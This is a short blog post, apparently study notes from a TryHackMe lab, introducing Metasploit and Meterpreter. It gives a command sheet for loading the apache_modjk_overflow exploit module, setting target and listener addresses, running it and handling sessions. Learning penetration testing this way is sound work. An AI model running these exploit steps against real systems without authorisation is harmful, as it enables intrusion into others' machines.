---
title:  "Metasploit"
date:   2022-12-13
excerpt: ""
categories: informationsecurity
tags: 
- metasploit
- red team
toc: true
toc_label: "My Table of Contents"
toc_icon: "cog"
classes: wide
---
## What is Metasploit/Meterpreter?

Metasploit is a powerful penetration testing tool for gaining initial access to systems, performing post-exploitation, and pivoting to other applications and systems. Metasploit is free, open-source software owned by the US-based cybersecurity firm Rapid7.[^1]

Meterpreter is an advanced payload that provides interactive access to a compromised system. Meterpreter supports running commands on a remote target, including uploading/downloading files and pivoting.

## Use Metasploit

```bash
# start console
msfconsole
    
# search for a model
search apache

# Load a module with the ‘use’ command
use exploit/windows/http/apache_modjk_overflow

# view the information about the module, including the module options, description, CVE details, etc
msf6 exploit(exploit/windows/http/apache_modjk_overflow) > info        

# View the available options to set
msf6 exploit(exploit/windows/http/apache_modjk_overflow) > show options

# Set the target host and logging
set rhost 10.10.10.20
set verbose true

# Set the payload listening address; this is the IP address of the host running Metasploit
set lhost LISTEN_IP

# show options again
show options

# Run or check the module
check
run
```

## Usefull Commands

```bash
# Inside a module
## check if target is vulnerable
check rhost=10.10.228.247 HttpClientTimeout=20

## show sessions
session

# Inside a session
## session to background
background
```

## References

[^1]: [tryhackme: Advent of Cyber Day 9]([https://tryhackme.com/room/cyberthreatintel](https://tryhackme.com/room/adventofcyber4)